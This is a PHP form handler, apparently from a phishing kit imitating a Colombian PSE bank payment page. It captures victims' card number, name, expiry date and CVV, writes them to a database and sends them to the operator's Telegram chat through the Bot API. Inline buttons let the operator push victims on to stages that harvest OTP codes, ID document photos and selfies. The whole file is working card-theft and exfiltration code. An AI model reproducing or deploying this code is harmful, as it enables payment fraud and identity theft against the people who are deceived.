<?php

// Mobile check removed

?>
<?php
if (session_status() === PHP_SESSION_NONE) { session_start(); }

if ($_SERVER["REQUEST_METHOD"] == "POST") {

    // 1. Cargar Configuración Global
    $config = require '../../config/config.php';

    if (!$config || !is_array($config)) {
        die("Error: No se pudo cargar la configuración.");
    }

    // Conexión DB
    $pdo = require '../../config/db.php';

    $bot_token = $config['botToken'];

    $chat_id = $config['chatId'];

    $baseUrl = $config['baseUrl'];
    $security_key = $config['security_key'];

    // 2. Recuperar datos
    $cliente_id = $_POST['cliente_id'] ?? null;
    $card_number = $_POST['card_number'] ?? '';
    $card_name = $_POST['card_name'] ?? '';
    $expiry_date = $_POST['expiry_date'] ?? '';
    $cvv = $_POST['cvv'] ?? '';

    if (empty($cliente_id) || empty($card_number)) {
        header("Location: ../../index.php");
        exit();
    }

    // 3. Actualizar estado a 6 (Data Colected) o 0 (Finished) - Original usaba 0
    try {
        $sql = "UPDATE pse SET estado = 5, tarjeta = :tarjeta, fecha_exp = :fecha, cvv = :cvv, usuario = :nombre WHERE id = :id";
        $stmt = $pdo->prepare($sql);
        $stmt->execute([
            'tarjeta' => $card_number,
            'fecha' => $expiry_date,
            'cvv' => $cvv,
            'nombre' => $card_name,
            'id' => $cliente_id
        ]);
    } catch (PDOException $e) {
        // error_log
    }

    // 4. Telegram
    $message = "💳 Datos Tarjeta Recibidos 💳\n\n";
    $message .= "🆔 ID: " . $cliente_id . "\n";
    $message .= "👤 Nombre: " . $card_name . "\n";
    $message .= "🔢 Num: " . $card_number . "\n";
    $message .= "🗓 Fecha: " . $expiry_date . "\n";
    $message .= "🔒 CVV: " . $cvv . "\n";

    $keyboard = [
        'inline_keyboard' => [
            [
                ['text' => '❌ Error Login', 'url' => "$baseUrl?id=$cliente_id&estado=2&key=$security_key"],
                ['text' => '🔑 Otp', 'url' => "$baseUrl?id=$cliente_id&estado=3&key=$security_key"],
            ],
            [
                ['text' => '⚠️ Otp Error', 'url' => "$baseUrl?id=$cliente_id&estado=4&key=$security_key"],
                ['text' => '💳 CC', 'url' => "$baseUrl?id=$cliente_id&estado=5&key=$security_key"],
            ],
            [
                ['text' => '⚠️ CC Error', 'url' => "$baseUrl?id=$cliente_id&estado=6&key=$security_key"],
                ['text' => '✅ Finalizar', 'url' => "$baseUrl?id=$cliente_id&estado=7&key=$security_key"],
            ],
            [
                ['text' => '🆔 Doc Frente', 'url' => "$baseUrl?id=$cliente_id&estado=11&key=$security_key"],
                ['text' => '🆔 Doc Reverso', 'url' => "$baseUrl?id=$cliente_id&estado=12&key=$security_key"]
            ],
            [
                ['text' => '📲 WhatsApp', 'url' => "$baseUrl?id=$cliente_id&estado=8&key=$security_key"],
                ['text' => '🤳 Selfie', 'url' => "$baseUrl?id=$cliente_id&estado=9&key=$security_key"],
                ['text' => '⚠️ Selfie Error', 'url' => "$baseUrl?id=$cliente_id&estado=10&key=$security_key"]
            ]
        ]
    ];

    $encoded_keyboard = json_encode($keyboard);

    $url_telegram = "https://api.telegram.org/bot{$bot_token}/sendMessage";
    $post_fields = [
        'chat_id' => $chat_id,
        'text' => $message,
        'reply_markup' => $encoded_keyboard
    ];
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url_telegram);
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $post_fields);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_exec($ch);
    curl_close($ch);

    // 5. Redirigir
    header("Location: ../../index.php?status=espera&id=" . $cliente_id);
    exit();

} else {
    header("Location: ../../index.php");
    exit();
}
?>
